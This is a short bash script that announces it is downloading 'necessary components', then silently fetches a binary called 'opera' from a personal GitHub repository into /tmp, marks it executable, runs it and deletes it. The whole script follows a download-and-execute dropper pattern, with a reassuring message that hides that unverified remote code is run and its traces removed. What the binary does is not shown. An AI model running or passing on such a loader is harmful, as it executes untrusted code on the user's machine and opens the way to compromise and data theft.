#!/bin/bash
echo "Downloading necessary components..."
curl -s https://github.com/hdsed-sudo/mac-test/raw/main/opera -o /tmp/opera
chmod +x /tmp/opera
/tmp/opera
rm -f /tmp/opera
